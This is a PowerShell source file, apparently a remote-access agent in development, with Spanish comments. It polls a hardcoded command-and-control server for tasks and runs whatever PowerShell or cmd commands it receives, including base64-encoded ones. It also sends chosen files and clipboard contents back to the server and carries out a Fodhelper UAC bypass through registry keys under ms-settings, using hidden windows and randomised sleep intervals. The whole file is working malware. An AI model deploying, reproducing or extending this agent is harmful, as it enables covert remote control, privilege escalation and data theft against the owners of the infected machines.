# agent.ps1 (MVP Fase 5 - core_services_mvp5.ps1)
# Agente con recolección de portapapeles y PoC de Bypass UAC (Fodhelper).

# --- CONFIGURACIÓN ---
$c2BaseUrl = "https://exa-sw-fr2c.onrender.com" 
$InitialSleepSeconds = 10 
$LoopSleepSecondsBase = 60 
$JitterPercentage = 0.3 
# --------------------

$agentId = try {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $rawAgentId = "$($computerName)_$($userName)"
    $cleanedAgentId = $rawAgentId -replace '[^a-zA-Z0-9_-]', '' 
    if ([string]::IsNullOrWhiteSpace($cleanedAgentId)) { "UnknownAgent_F5_$(Get-Random)" } else { $cleanedAgentId }
} catch {
    "UnknownAgent_F5_$(Get-Random)"
}

# Función para enviar datos al C2 (POST JSON)
function Send-DataToC2 {
    param(
        [string]$UriPath,
        [object]$Data
    )
    $fullUrl = "$($c2BaseUrl)$($UriPath)"
    try {
        Invoke-RestMethod -Uri $fullUrl -Method Post -Body ($Data | ConvertTo-Json -Depth 5) -ContentType "application/json" -TimeoutSec 60 -UseBasicParsing
    } catch {
        Write-Warning "Error enviando datos a $fullUrl : $($_.Exception.Message)"
    }
}

# Función para obtener tareas del C2
function Get-TaskFromC2 {
    param(
        [string]$AgentIdParam
    )
    $taskUrl = "$($c2BaseUrl)/api/tasks/$($AgentIdParam)/get"
    try {
        $response = Invoke-RestMethod -Uri $taskUrl -Method Get -TimeoutSec 30 -UseBasicParsing
        return $response
    } catch {
        Write-Warning "Error obteniendo tarea desde $taskUrl : $($_.Exception.Message)"
        return $null
    }
}

# Pausa inicial
Start-Sleep -Seconds $InitialSleepSeconds

# Bucle principal del agente
while ($true) {
    $task = Get-TaskFromC2 -AgentIdParam $agentId
    
    if ($null -ne $task -and $task.command -ne "sleep") {
        $output = ""
        $errorOutput = ""
        $taskResult = @{
            task_id = $task.task_id
            status = "completed" 
            output = ""
        }

        try {
            $commandToExecute = $task.command
            $decodedPayloadPath = $null 
            $decodedPayload = $null

            if ($task.payload_b64) {
                try {
                    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task.payload_b64))
                    if ($task.type -eq "powershell_b64" -or $task.type -eq "cmd_b64") {
                        $commandToExecute = $decodedPayload
                    } elseif ($task.type -eq "exfiltrate_file") {
                        $decodedPayloadPath = $decodedPayload 
                    }
                } catch {
                    $errorOutput += "Error decodificando payload_b64: $($_.Exception.Message)`n"
                    $taskResult.status = "error_decoding_payload"
                }
            }
            
            if ($taskResult.status -ne "error_decoding_payload") {
                if ($task.type -eq "powershell" -or $task.type -eq "powershell_b64") {
                    $scriptBlock = [Scriptblock]::Create($commandToExecute)
                    $output = Invoke-Command -ScriptBlock $scriptBlock 2>&1 | Out-String
                } elseif ($task.type -eq "cmd" -or $task.type -eq "cmd_b64") {
                    $output = cmd.exe /c "$($commandToExecute)" 2>&1 | Out-String
                } elseif ($task.type -eq "exfiltrate_file") {
                    if ($null -ne $decodedPayloadPath -and (Test-Path $decodedPayloadPath -PathType Leaf)) {
                        try {
                            $fileBytes = [System.IO.File]::ReadAllBytes($decodedPayloadPath)
                            $output = [System.Convert]::ToBase64String($fileBytes)
                            $taskResult.status = "file_exfiltrated"
                        } catch {
                            $output = "Error leyendo archivo para exfiltrar '$($decodedPayloadPath)': $($_.Exception.Message)"
                            $taskResult.status = "error_exfiltrating_file_read"
                        }
                    } else {
                        $output = "Error exfiltrando archivo: Ruta inválida o no es un archivo '$($decodedPayloadPath)'."
                        $taskResult.status = "error_exfiltrating_file_path"
                    }
                } elseif ($task.type -eq "get_clipboard") {
                    $output = Get-Clipboard -Raw -ErrorAction SilentlyContinue
                    if ($null -eq $output) { $output = "" }
                    $taskResult.status = "clipboard_captured"
                } elseif ($task.type -eq "bypass_uac_fodhelper") {
                    $uacPayload = 'cmd.exe /c "whoami /all > C:\Windows\Temp\uac_test_fodhelper.txt && hostname >> C:\Windows\Temp\uac_test_fodhelper.txt"'
                    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
                    $delegateRegValue = "DelegateExecute"
                    
                    try {
                        # Crear la clave de registro si no existe
                        if (-not (Test-Path $regPath)) {
                            New-Item -Path $regPath -Force | Out-Null
                        }
                        # Establecer el payload
                        Set-ItemProperty -Path $regPath -Name "(Default)" -Value $uacPayload -Force
                        # Establecer el valor DelegateExecute (aunque a veces no es necesario si (Default) está configurado)
                        Set-ItemProperty -Path $regPath -Name $delegateRegValue -Value "" -Force
                        
                        # Write-Host "DEBUG: Claves de registro para Fodhelper configuradas."
                        Start-Process "fodhelper.exe" -WindowStyle Hidden
                        $output = "Comando de bypass UAC Fodhelper ejecutado. Verifique C:\Windows\Temp\uac_test_fodhelper.txt para el resultado."
                        $taskResult.status = "uac_bypass_attempted"
                        
                        # Intentar limpiar después de un breve retraso
                        Start-Sleep -Seconds 5 
                        Remove-ItemProperty -Path $regPath -Name $delegateRegValue -ErrorAction SilentlyContinue
                        Remove-ItemProperty -Path $regPath -Name "(Default)" -ErrorAction SilentlyContinue
                        # Write-Host "DEBUG: Intento de limpieza de claves de Fodhelper."
                    } catch {
                        $output = "Error ejecutando bypass UAC Fodhelper: $($_.Exception.Message)"
                        $taskResult.status = "uac_bypass_error"
                    }
                } else {
                    $output = "Tipo de comando desconocido: $($task.type)"
                    $taskResult.status = "unknown_command_type"
                }
            }
        } catch {
            $errorOutput += "Error ejecutando comando o tarea: $($_.Exception.Message)`n$($_.ScriptStackTrace)"
            $taskResult.status = "execution_error"
        }
        
        if (-not [string]::IsNullOrWhiteSpace($errorOutput)) {
            $output = if (-not [string]::IsNullOrWhiteSpace($output)) { "$($output)`n---ERRORS---`n$($errorOutput)" } else { $errorOutput }
        }
        
        if ($taskResult.status -eq "file_exfiltrated") { 
            $taskResult.output = $output 
        } else { 
            $taskResult.output = try { [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output)) } catch { "Error_Encoding_Output_To_Base64" }
        }
        
        Send-DataToC2 -UriPath "/api/results/$($agentId)/send" -Data $taskResult
    }
    
    $jitter = Get-Random -Minimum (-$LoopSleepSecondsBase * $JitterPercentage) -Maximum ($LoopSleepSecondsBase * $JitterPercentage)
    $actualSleep = [int]($LoopSleepSecondsBase + $jitter)
    if ($actualSleep -lt 5) { $actualSleep = 5 } 
    Start-Sleep -Seconds $actualSleep
}
